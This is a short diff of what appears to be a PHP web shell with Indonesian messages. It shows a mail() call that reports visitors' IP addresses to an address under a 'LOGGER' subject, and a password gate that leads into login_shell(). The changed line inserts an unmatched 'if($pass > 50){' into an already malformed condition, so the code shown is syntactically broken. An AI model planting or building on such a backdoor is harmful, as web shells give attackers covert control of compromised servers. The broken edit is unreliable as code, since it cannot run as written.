@@ -258,7 +258,7 @@ mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]")
 exit;
 }
 if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
-    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) die("<center><b><font color='red'>Password yang Anda masukkan salah Goblok..!".$warn."</font></b></center>") ) )
+    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) if($pass > 50){ die("<center><b><font color='red'>Password yang Anda masukkan salah Goblok..!".$warn."</font></b></center>") ) )
         $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
     else
         login_shell();
